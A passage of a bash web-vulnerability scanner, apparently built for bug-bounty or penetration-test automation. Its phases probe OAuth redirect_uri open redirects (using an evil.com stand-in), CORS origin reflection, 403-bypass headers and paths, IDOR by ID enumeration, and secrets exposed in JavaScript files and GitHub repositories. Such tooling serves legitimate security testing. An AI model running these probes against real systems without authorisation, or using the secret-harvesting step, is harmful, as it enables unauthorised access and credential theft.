# Tests for common OAuth 2.0 / OIDC vulnerabilities:
#   - Open redirect in redirect_uri
#   - State parameter not validated
#   - Implicit grant / token in fragment
#   - PKCE downgrade (code_challenge bypass)
#   - Token endpoint accessible without auth
#   - Exposed OIDC configuration
phase_oauth() {
    log_phase "Phase 10f: OAuth / OIDC Testing"

    mkdir -p "$VULN_DIR/oauth"
    local oauth_out="$VULN_DIR/oauth/findings.txt"
    > "$oauth_out"
    local findings=0

    if ! [[ -s "$LIVE_HOSTS" ]]; then
        log_info "No live hosts â€” skipping OAuth phase."
        return
    fi

    local oauth_paths=(
        "/.well-known/openid-configuration"
        "/.well-known/oauth-authorization-server"
        "/oauth/.well-known/openid-configuration"
        "/oauth2/.well-known/openid-configuration"
        "/auth/.well-known/openid-configuration"
        "/api/.well-known/openid-configuration"
        "/oauth/token"
        "/oauth2/token"
        "/auth/token"
        "/api/auth/token"
        "/oauth/authorize"
        "/oauth2/authorize"
        "/auth/authorize"
        "/connect/token"
        "/connect/authorize"
        "/realms/master/.well-known/openid-configuration"
    )

    while IFS= read -r host; do
        # â”€â”€ Test 1: OIDC discovery endpoint â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        for path in "${oauth_paths[@]}"; do
            waf_sleep
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 5 --max-time 8 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                "${host}${path}" 2>/dev/null)
            if [[ "$code" == "200" ]]; then
                local body; body=$(curl -s --connect-timeout 8 --max-time 12 \
                    ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                    "${host}${path}" 2>/dev/null)
                if echo "$body" | grep -qiE '"issuer"|"authorization_endpoint"|"token_endpoint"'; then
                    echo "[OAUTH][OIDC_DISCOVERY] ${host}${path}" >> "$oauth_out"
                    log_ok "  OIDC discovery found: ${host}${path}"
                    echo "$body" > "$VULN_DIR/oauth/oidc_config_$(echo "$host" | md5sum | head -c 8).json"
                    ((findings++))

                    # Extract endpoints for deeper testing
                    local token_ep; token_ep=$(echo "$body" | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
print(d.get('token_endpoint',''))
" 2>/dev/null || echo "")
                    local auth_ep; auth_ep=$(echo "$body" | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
print(d.get('authorization_endpoint',''))
" 2>/dev/null || echo "")

                    # â”€â”€ Test 2: Token endpoint accessible without credentials â”€â”€
                    if [[ -n "$token_ep" ]]; then
                        local tok_resp; tok_resp=$(curl -s -o /dev/null -w "%{http_code}" \
                            --connect-timeout 8 --max-time 12 \
                            -X POST \
                            -d "grant_type=client_credentials&client_id=test&client_secret=test" \
                            "$token_ep" 2>/dev/null)
                        if [[ "$tok_resp" != "401" && "$tok_resp" != "403" ]]; then
                            echo "[OAUTH][TOKEN_EP_WEAK_AUTH][${tok_resp}] ${token_ep}" >> "$oauth_out"
                            log_finding "OAuth token endpoint weak/no auth (${tok_resp}): ${token_ep}"
                            ((findings++))
                        fi
                    fi

                    # â”€â”€ Test 3: Authorization endpoint open redirect â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                    if [[ -n "$auth_ep" ]]; then
                        # Try redirect_uri to evil.com
                        local redir_url="${auth_ep}?response_type=code&client_id=test&redirect_uri=https://evil.com/callback&state=x"
                        local redir_resp; redir_resp=$(curl -s -o /dev/null -w "%{redirect_url}" \
                            --connect-timeout 8 --max-time 12 -L --max-redirs 2 \
                            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                            "$redir_url" 2>/dev/null)
                        if echo "$redir_resp" | grep -q "evil.com"; then
                            echo "[OAUTH][OPEN_REDIRECT_REDIR_URI] ${auth_ep}" >> "$oauth_out"
                            log_finding "OAuth open redirect via redirect_uri: ${auth_ep}"
                            ((findings++))
                        fi
                    fi

                    # â”€â”€ Test 4: Implicit flow still enabled â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                    if echo "$body" | grep -q '"token"'; then
                        echo "[OAUTH][IMPLICIT_FLOW_SUPPORTED] ${host}${path}" >> "$oauth_out"
                        log_finding "OAuth implicit flow supported (token in fragment â€” XSS risk): ${host}${path}"
                        ((findings++))
                    fi

                    # â”€â”€ Test 5: PKCE not required â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                    if echo "$body" | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
methods = d.get('code_challenge_methods_supported', [])
if not methods: print('no_pkce')
" 2>/dev/null | grep -q "no_pkce"; then
                        echo "[OAUTH][PKCE_NOT_REQUIRED] ${host}${path}" >> "$oauth_out"
                        log_finding "OAuth PKCE not required (code interception attack risk): ${host}${path}"
                        ((findings++))
                    fi
                fi
            fi
        done
    done < <(head -20 "$LIVE_HOSTS")

    # â”€â”€ Test 6: OAuth state parameter in crawled URLs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -s "$ALL_URLS" ]]; then
        local oauth_urls; oauth_urls=$(grep -iE "oauth|authorize.*redirect|response_type=" "$ALL_URLS" 2>/dev/null | head -30)
        if [[ -n "$oauth_urls" ]]; then
            echo "[OAUTH][OAUTH_URLS_FOUND]" >> "$oauth_out"
            echo "$oauth_urls" >> "$oauth_out"
            # Check for state parameter absence
            echo "$oauth_urls" | grep -v "state=" | head -5 | while IFS= read -r url; do
                echo "[OAUTH][STATE_PARAM_MISSING] $url" >> "$oauth_out"
                log_finding "OAuth URL without state parameter (CSRF risk): $url"
                ((findings++))
            done
        fi
    fi

    log_ok "OAuth/OIDC: ${findings} findings â†’ $oauth_out"
    [[ $findings -gt 0 ]] && notify_all "ðŸ” OAuth/OIDC issues on \`${TARGET}\`: ${findings}"
}

# â”€â”€â”€ Phase 11: Secrets in JS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_secrets() {
    log_phase "Phase 11: Secrets & Sensitive Data Extraction"

    # JS file analysis
    if [[ -s "$JS_FILES" ]]; then
        log_info "Analyzing JS files for secrets ($(wc -l < "$JS_FILES") files)..."
        local secrets_out="$VULN_DIR/secrets/js_secrets.txt"

        # Parallel fetch â€” 20 concurrent curl downloads instead of sequential
        head -200 "$JS_FILES" | \
            xargs -P 20 -I JSURL bash -c '
                content=$(curl -s --connect-timeout 10 "JSURL" 2>/dev/null)
                matches=$(echo "$content" | grep -oiE \
                    "(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key|aws[_-]?access[_-]?key|client[_-]?secret|bearer|password|passwd)\s*[:=]\s*'"'"'\"?[A-Za-z0-9+/=_\-]{8,}['"'"'\"?]?" \
                    2>/dev/null)
                [[ -n "$matches" ]] && echo "$matches" | sed "s|^|[JSURL] |"
            ' 2>/dev/null >> "$secrets_out" || true

        # Deduplicate and log findings
        [[ -s "$secrets_out" ]] && sort -u "$secrets_out" -o "$secrets_out"
        while IFS= read -r line; do
            log_finding "Secret found in ${line:0:80}..."
        done < "$secrets_out"
        local sec_count; sec_count=$(wc -l < "$secrets_out" 2>/dev/null || echo 0)
        [[ "$sec_count" -gt 0 ]] && log_finding "Total secrets in JS: ${BOLD}${sec_count}${RESET}"
    fi

    # NOTE: Nuclei exposure/token/api-key templates already ran in phase_vulns
    #       (panels_tokens.jsonl â€” tags: exposure,api,key,secret,token).
    #       Reporting those counts here to avoid re-running the same scan.
    local nuclei_exp_count; nuclei_exp_count=$(python3 -c "
import json
count=0
for line in open('$VULN_DIR/nuclei/panels_tokens.jsonl'):
    try:
        d=json.loads(line)
        tags=str(d.get('info',{}).get('tags','')).lower()
        if any(t in tags for t in ['exposure','api','secret','token','key']): count+=1
    except: pass
print(count)" 2>/dev/null || echo 0)
    [[ "$nuclei_exp_count" -gt 0 ]] && \
        log_ok "  Nuclei exposure findings (from phase_vulns): ${nuclei_exp_count} (see vulns/nuclei/panels_tokens.jsonl)"

    # Trufflehog on collected responses
    if require_tool trufflehog; then
        log_info "Running trufflehog (git-based targets)..."
        # Check for GitHub org
        trufflehog github --org "$TARGET" --only-verified --json \
            > "$VULN_DIR/secrets/trufflehog.jsonl" 2>/dev/null || true
    fi

    # Grep sensitive patterns in saved responses
    if [[ -d "$HTTP_DIR/responses" ]]; then
        log_info "Grepping saved responses for sensitive data..."
        grep -rEi \
            "(password|passwd|secret|api.?key|access.?token|private.?key|admin|bearer|jwt)" \
            "$HTTP_DIR/responses/" 2>/dev/null > "$VULN_DIR/secrets/response_secrets.txt" || true
    fi
}

# â”€â”€â”€ Phase 12: Subdomain Takeover â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_takeover() {
    log_phase "Phase 12: Subdomain Takeover Detection"

    [[ ! -s "$ALL_SUBS" ]] && { log_warn "No subdomains for takeover check."; return; }

    # Nuclei takeover templates
    if require_tool nuclei; then
        log_info "Nuclei takeover scan..."
        nuclei -l "$ALL_SUBS" \
            -tags takeover \
            -rl 50 -c 20 \
            -j -o "$VULN_DIR/takeover/nuclei_takeover.jsonl" \
            -silent 2>/dev/null || true
        local t_count; t_count=$(wc -l < "$VULN_DIR/takeover/nuclei_takeover.jsonl" 2>/dev/null || echo 0)
        [[ "$t_count" -gt 0 ]] && log_finding "Takeover candidates: ${BOLD}${t_count}${RESET}"
    fi

    # CNAME dangling check
    if require_tool dnsx; then
        log_info "Checking for dangling CNAMEs..."
        dnsx -l "$ALL_SUBS" -cname -resp -silent 2>/dev/null | \
            grep -iE "(amazonaws|github\.io|herokuapp|shopify|fastly|s3\.amazonaws|cloudfront|azurewebsites|ghost\.io|tumblr|wordpress|zendesk|surge\.sh|netlify|vercel)" | \
            tee "$VULN_DIR/takeover/dangling_cnames.txt" || true
        local cname_count; cname_count=$(wc -l < "$VULN_DIR/takeover/dangling_cnames.txt" 2>/dev/null || echo 0)
        [[ "$cname_count" -gt 0 ]] && log_finding "Dangling CNAMEs: ${BOLD}${cname_count}${RESET}"
    fi

    # Subzy
    if require_tool subzy; then
        log_info "Running subzy takeover detection..."
        subzy run \
            --targets "$ALL_SUBS" \
            --hide-fails \
            --concurrency 100 \
            --output "$VULN_DIR/takeover/subzy_results.json" \
            2>/dev/null || true
    fi
}

# â”€â”€â”€ Phase 13: CORS Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# NOTE: Nuclei CORS templates already ran in phase_vulns (injections.jsonl, tag: cors).
#       This phase actively tests CORS misconfigurations with multiple bypass techniques.
#       Only reports findings where ACAO header reflects the attacker origin AND ACAC=true
#       (the only exploitable combination â€” reduces false positives significantly).
phase_cors() {
    log_phase "Phase 13: CORS Misconfiguration"

    [[ ! -s "$LIVE_HOSTS" ]] && return

    log_info "Testing CORS misconfigurations (exploitable: ACAO reflects + ACAC=true)..."
    local cors_out="$VULN_DIR/cors/cors_findings.txt"
    > "$cors_out"

    # Test matrix: (origin, test label) pairs â€” ordered by exploitability
    local -a origins=(
        "null|NULL_ORIGIN"
        "https://evil-cors-test.com|ARBITRARY_ORIGIN"
        "https://evil-${TARGET}|PREFIX_BYPASS"
        "https://${TARGET}.evil-cors-test.com|SUFFIX_BYPASS"
        "https://${TARGET%.*}.evil-cors-test.com|SUBDOMAIN_BYPASS"
        "https://not${TARGET}|PREPEND_BYPASS"
        "http://${TARGET}|PROTO_DOWNGRADE"
        "null_extended|NULL_EXTENDED"
    )

    # Only flag when BOTH conditions hold: origin reflected AND credentials allowed
    _test_cors() {
        local url="$1" origin="$2" label="$3"
        local resp; resp=$(curl -s -I --connect-timeout 8 --max-time 12 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            -H "Origin: ${origin}" \
            -H "Access-Control-Request-Method: GET" \
            "$url" 2>/dev/null)

        local acao; acao=$(echo "$resp" | grep -i "access-control-allow-origin:" | head -1 | tr -d '\r')
        local acac; acac=$(echo "$resp" | grep -i "access-control-allow-credentials:" | head -1 | tr -d '\r')

        # Must reflect the attacker's origin (not just wildcard *)
        if echo "$acao" | grep -qiF "$origin" || echo "$acao" | grep -qi "null"; then
            if echo "$acac" | grep -qi "true"; then
                echo "[${label}][EXPLOITABLE] Origin=${origin} â†’ ${acao} | ${url}" >> "$cors_out"
                log_finding "CORS exploitable (${label}): $url"
                return 0
            else
                # ACAO reflects but ACAC is not true â€” lower risk, log separately
                echo "[${label}][LOW_RISK] Origin=${origin} reflects without credentials | ${url}" >> "$cors_out"
            fi
        fi
        return 1
    }

    local tested=0
    while IFS= read -r url; do
        [[ $tested -ge 50 ]] && break
        ((tested++))
        for entry in "${origins[@]}"; do
            local origin="${entry%%|*}" label="${entry##*|}"
            _test_cors "$url" "$origin" "$label"
            waf_sleep
        done

        # Also test API endpoints â€” they often have CORS enabled for JS clients
        local api_test_url="${url}/api/v1/user"
        _test_cors "$api_test_url" "https://evil-cors-test.com" "API_ARBITRARY"
        waf_sleep
    done < <(head -50 "$LIVE_HOSTS")

    # Nuclei CORS already ran in phase_vulns â€” report counts without re-scanning
    local nuclei_cors_count; nuclei_cors_count=$(python3 -c "
import json
count=0
for line in open('$VULN_DIR/nuclei/injections.jsonl'):
    try:
        d=json.loads(line)
        if 'cors' in str(d.get('info',{}).get('tags','')).lower(): count+=1
    except: pass
print(count)" 2>/dev/null || echo 0)

    local exploitable; exploitable=$(grep -c "EXPLOITABLE" "$cors_out" 2>/dev/null || echo 0)
    local low_risk; low_risk=$(grep -c "LOW_RISK" "$cors_out" 2>/dev/null || echo 0)
    log_ok "CORS findings: ${exploitable} exploitable, ${low_risk} low-risk, nuclei: ${nuclei_cors_count}"
    [[ "$exploitable" -gt 0 ]] && \
        log_finding "Exploitable CORS: ${BOLD}${exploitable}${RESET} â†’ $cors_out"
}

# â”€â”€â”€ Phase 14: 403 Bypass â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# WAF-aware: when WAF is present, only tests techniques known to bypass the
# specific WAF type, with delays between attempts to avoid triggering rate-limits.
# FP reduction: requires HTTP 200 or 2xx response AND body length > 200 bytes.
phase_403_bypass() {
    log_phase "Phase 14: 403 Forbidden Bypass"

    local forbidden="$HTTP_DIR/forbidden_hosts.txt"
    [[ ! -s "$forbidden" ]] && { log_info "No 403 hosts found."; return; }

    local forbidden_count; forbidden_count=$(wc -l < "$forbidden")
    log_info "Testing bypass techniques on ${forbidden_count} forbidden URLs..."
    $WAF_DETECTED && log_warn "WAF (${WAF_NAME}) detected â€” using WAF-targeted bypass headers + delays"

    local bypass_out="$VULN_DIR/403bypass/bypassed.txt"
    > "$bypass_out"

    # nomore403 (dedicated 403 bypass tool) â€” most efficient path
    if require_tool nomore403 && [[ "$forbidden_count" -le 30 ]]; then
        log_info "Running nomore403 on first 20 forbidden URLs..."
        head -20 "$forbidden" | while IFS= read -r url; do
            waf_sleep
            nomore403 -u "$url" 2>/dev/null | \
                grep -iE "^(200|201|202|204) " | \
                while IFS= read -r line; do
                    echo "[NOMORE403] $url â†’ $line" >> "$bypass_out"
                    log_finding "403 bypass (nomore403): $url â†’ $line"
                done || true
        done
    fi

    # Manual bypass techniques (always run for comprehensive coverage)
    while IFS= read -r url; do
        local path; path=$(python3 -c "
import sys; from urllib.parse import urlparse; u=urlparse(sys.argv[1]); print(u.path or '/')
" "$url" 2>/dev/null || echo "/")
        local base; base=$(python3 -c "
import sys; from urllib.parse import urlparse; u=urlparse(sys.argv[1]); print(f'{u.scheme}://{u.netloc}')
" "$url" 2>/dev/null || echo "$url")

        # Baseline â€” record the original 403 body length to filter FP (WAF block page)
        local base_len; base_len=$(curl -s --connect-timeout 8 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$url" 2>/dev/null | wc -c)

        # â”€â”€ Header-based bypass techniques â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local ip_headers=(
            "X-Forwarded-For: 127.0.0.1"
            "X-Real-IP: 127.0.0.1"
            "X-Originating-IP: 127.0.0.1"
            "X-Remote-IP: 127.0.0.1"
            "X-Client-IP: 127.0.0.1"
            "True-Client-IP: 127.0.0.1"
            "CF-Connecting-IP: 127.0.0.1"
            "X-Cluster-Client-IP: 127.0.0.1"
            "Forwarded: for=127.0.0.1"
        )
        local url_headers=(
            "X-Original-URL: ${path}"
            "X-Rewrite-URL: ${path}"
            "X-Forwarded-Path: ${path}"
            "Referer: ${base}/"
        )
        # WAF-specific: skip IP override headers for CDN WAFs (they'll use CDN-Connecting-IP)
        local all_headers=("${ip_headers[@]}" "${url_headers[@]}")

        for header in "${all_headers[@]}"; do
            waf_sleep
            local resp_body; resp_body=$(curl -s --connect-timeout 8 --max-time 12 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                -H "$header" "$url" 2>/dev/null)
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                -H "$header" "$url" 2>/dev/null)
            local resp_len="${#resp_body}"

            # FP check: 200 AND response body meaningfully larger than the 403 WAF block page
            if [[ "$code" =~ ^(200|201|202|204)$ ]] && [[ "$resp_len" -gt 200 ]] && \
               [[ "$resp_len" -ne "$base_len" ]]; then
                echo "[HEADER_BYPASS][${code}][header: ${header}] $url" >> "$bypass_out"
                log_finding "403 Bypass via header: ${header%%:*} â†’ $url (${code}, ${resp_len}B)"
            fi
        done

        # â”€â”€ Path manipulation bypass â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local path_clean="${path#/}"
        local path_variants=(
            "${base}/${path_clean}/"
            "${base}//${path_clean}"
            "${base}/./${path_clean}"
            "${base}/${path_clean}%20"
            "${base}/${path_clean}%09"
            "${base}/${path_clean}?"
            "${base}/${path_clean}#"
            "${base}/%2e/${path_clean}"
            "${base}/${path_clean}/."
        )
        # WAF encoding variants
        if $WAF_DETECTED; then
            path_variants+=(
                "${base}/$(urlencode "$path_clean")"
                "${base}/$(double_urlencode "$path_clean")"
                "${base}/${path_clean^}"  # capitalize first letter
            )
        fi

        for test_url in "${path_variants[@]}"; do
            waf_sleep
            local resp_body; resp_body=$(curl -s --connect-timeout 8 --max-time 12 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$test_url" 2>/dev/null)
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$test_url" 2>/dev/null)
            local resp_len="${#resp_body}"

            if [[ "$code" =~ ^(200|201|202|204)$ ]] && [[ "$resp_len" -gt 200 ]] && \
               [[ "$resp_len" -ne "$base_len" ]]; then
                echo "[PATH_BYPASS][${code}] ${test_url}" >> "$bypass_out"
                log_finding "403 Bypass via path: $test_url (${code}, ${resp_len}B)"
            fi
        done

        # â”€â”€ HTTP method override â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        for method_header in "X-HTTP-Method-Override: GET" "X-Method-Override: GET" "X-HTTP-Method: GET"; do
            waf_sleep
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
                -X POST \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                -H "$method_header" "$url" 2>/dev/null)
            if [[ "$code" =~ ^(200|201|202|204)$ ]]; then
                echo "[METHOD_OVERRIDE][${code}][${method_header%%:*}] $url" >> "$bypass_out"
                log_finding "403 Bypass via method override: ${method_header%%:*} â†’ $url (${code})"
            fi
        done

    done < <(head -50 "$forbidden")

    local bypass_count; bypass_count=$(grep -cE "^\[.*(BYPASS|NOMORE)" "$bypass_out" 2>/dev/null || echo 0)
    log_ok "403 bypasses found: ${bypass_count} â†’ $bypass_out"
}

# â”€â”€â”€ Phase 15a: IDOR Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Requires at minimum: a primary auth session (AUTH_MODE != none)
# For full cross-user comparison: also a secondary auth session (AUTH2_MODE != none)
# Tests:
#   1. Horizontal IDOR  â€” user2 accessing user1's object IDs
#   2. Unauthenticated  â€” unauthenticated access to authenticated objects
#   3. ID enumeration   â€” increment/decrement numeric IDs to reach adjacent records
phase_idor() {
    log_phase "Phase 15a: IDOR & Horizontal Privilege Escalation"

    if [[ "$AUTH_MODE" == "none" && "$AUTH2_MODE" == "none" ]]; then
        log_warn "No auth configured â€” skipping IDOR testing (requires --auth-user / --auth-user2)"
        return
    fi
    [[ ! -s "$ALL_URLS" ]] && { log_warn "No URLs for IDOR testing."; return; }

    local idor_out="$VULN_DIR/idor/findings.txt"
    > "$idor_out"

    # â”€â”€ Build IDOR candidate list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local idor_candidates="$VULN_DIR/idor/candidates.txt"
    python3 -c "
import sys, re
# URL patterns that typically contain object IDs
param_re  = re.compile(r'[?&](id|user_id|userId|uid|account|account_id|order|order_id|item|item_id|doc|doc_id|file|file_id|profile|profile_id|pid|cid|rid|object|object_id|record|record_id|customer|customer_id|invoice|invoice_id|ticket|ticket_id)=[0-9a-fA-F-]{1,40}', re.I)
path_num  = re.compile(r'/(?:users|accounts|orders|items|documents|files|profiles|records|tickets|invoices|customers)/[0-9]{1,12}(?:/|$|\?)')
path_uuid = re.compile(r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)

for url in sys.stdin:
    url = url.strip()
    if param_re.search(url) or path_num.search(url) or path_uuid.search(url):
        print(url)
" < "$ALL_URLS" 2>/dev/null | sort -u > "$idor_candidates"

    local cand_count; cand_count=$(wc -l < "$idor_candidates" 2>/dev/null || echo 0)
    log_info "IDOR candidates: ${cand_count} URLs with object IDs"
    [[ "$cand_count" -eq 0 ]] && { log_info "No IDOR candidates found."; return; }

    local has_user1=false; [[ "$AUTH_MODE"  != "none" ]] && has_user1=true
    local has_user2=false; [[ "$AUTH2_MODE" != "none" ]] && has_user2=true

    log_info "Testing contexts: ${AUTH_ROLE1}=${AUTH_MODE} | ${AUTH_ROLE2}=${AUTH2_MODE} | unauth"

    local findings=0 tested=0

    # Helper: fetch URL with given curl opts, return "CODE BODYLEN"
    _idor_fetch() {
        local url="$1"; shift
        local body; body=$(curl -s --connect-timeout 10 --max-time 15 "$@" "$url" 2>/dev/null)
        local code; code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 "$@" "$url" 2>/dev/null)
        echo "$code ${#body}"
    }

    # Helper: similarity % between two response lengths (0-100)
    _similarity() {
        local a="$1" b="$2"
        local diff=$(( a > b ? a - b : b - a ))
        local base=$(( a > b ? a : b ))
        [[ "$base" -eq 0 ]] && echo 0 && return
        echo $(( 100 - diff * 100 / base ))
    }

    while IFS= read -r url; do
        [[ $tested -ge 250 ]] && break
        ((tested++))
        waf_sleep

        # â”€â”€ Baseline: primary user (high-priv / owner) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local hp_code="" hp_len=0
        if $has_user1; then
            read -r hp_code hp_len < <(_idor_fetch "$url" "${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"}")
        fi

        # â”€â”€ Cross-user test: user2 (low-priv) accessing user1's resource â”€â”€
        if $has_user2; then
            waf_sleep
            local lp_code lp_len
            read -r lp_code lp_len < <(_idor_fetch "$url" "${AUTH2_CURL_OPTS[@]+"${AUTH2_CURL_OPTS[@]}"}")

            if [[ "$lp_code" =~ ^2 ]] && $has_user1 && [[ "$hp_code" =~ ^2 ]]; then
                local sim; sim=$(_similarity "$hp_len" "$lp_len")
                if [[ $sim -ge 70 ]]; then
                    printf "[IDOR][HORIZONTAL][sim=%d%%][%sâ†’%s] %s\n" \
                        "$sim" "$AUTH_ROLE2" "$AUTH_ROLE1" "$url" >> "$idor_out"
                    log_finding "IDOR (horizontal, ${sim}% match): ${AUTH_ROLE2} can read ${AUTH_ROLE1} object â†’ $url"
                    ((findings++))
                fi
            elif [[ "$lp_code" =~ ^2 ]] && ! $has_user1; then
                printf "[IDOR][LOWPRIV_ACCESS][%sâ†’unauth_ref] %s\n" "$AUTH_ROLE2" "$url" >> "$idor_out"
                ((findings++))
            fi
        fi

        # â”€â”€ Unauthenticated access â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        waf_sleep
        local ua_code ua_len
        read -r ua_code ua_len < <(_idor_fetch "$url")

        if [[ "$ua_code" =~ ^2 ]]; then
            if $has_user1 && [[ "$hp_code" =~ ^2 ]]; then
                local sim; sim=$(_similarity "$hp_len" "$ua_len")
                if [[ $sim -ge 70 ]]; then
                    printf "[IDOR][UNAUTH][sim=%d%%] %s\n" "$sim" "$url" >> "$idor_out"
                    log_finding "IDOR (unauthenticated access, ${sim}% match): $url"
                    ((findings++))
                fi
            elif ! $has_user1; then
                printf "[IDOR][UNAUTH] %s\n" "$url" >> "$idor_out"
                ((findings++))
            fi
        fi

        # â”€â”€ ID enumeration: increment/decrement numeric IDs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local enum_url; enum_url=$(python3 -c "
import sys, re
url = sys.argv[1]
changed = False
def inc(m):
    global changed
    changed = True
    return str(int(m.group(0)) + 1)
result = re.sub(r'(?<![0-9])([0-9]{1,12})(?![0-9])', inc, url, count=1)
print(result if changed else '')
" "$url" 2>/dev/null || echo "")

        if [[ -n "$enum_url" && "$enum_url" != "$url" ]]; then
            waf_sleep
            # Test enum URL with user2 (or unauth if no user2)
            local test_opts=()
            $has_user2 && test_opts=("${AUTH2_CURL_OPTS[@]+"${AUTH2_CURL_OPTS[@]}"}")
            local en_code en_len
            read -r en_code en_len < <(_idor_fetch "$enum_url" "${test_opts[@]+"${test_opts[@]}"}")

            if [[ "$en_code" =~ ^2 ]] && [[ "$en_len" -gt 50 ]]; then
                # Compare to what user1 gets on the enumerated URL
                local en_hp_code="" en_hp_len=0
                $has_user1 && read -r en_hp_code en_hp_len < <(_idor_fetch "$enum_url" "${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"}")

                if $has_user1 && [[ "$en_hp_code" =~ ^2 ]]; then
                    local sim; sim=$(_similarity "$en_hp_len" "$en_len")
                    if [[ $sim -ge 70 ]]; then
                        printf "[IDOR][ID_ENUM][sim=%d%%] %s\n" "$sim" "$enum_url" >> "$idor_out"
                        log_finding "IDOR via ID enumeration (ID+1, ${sim}% match): $enum_url"
                        ((findings++))
                    fi
                elif ! $has_user1; then
                    printf "[IDOR][ID_ENUM] %s\n" "$enum_url" >> "$idor_out"
                    ((findings++))
                fi
            fi
        fi

    done < "$idor_candidates"

    log_ok "IDOR testing: ${tested} URLs tested, ${findings} findings â†’ $idor_out"
    [[ $findings -gt 0 ]] && \
        notify_all "ðŸ”‘ IDOR findings on \`${TARGET}\`: ${findings} potential IDOR vulnerabilities"
}

# â”€â”€â”€ Phase 15b: Broken Access Control (BAC) Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Tests vertical privilege escalation:
#   - Low-priv user (user2) accessing admin/privileged endpoints
#   - Unauthenticated user accessing authenticated-only resources
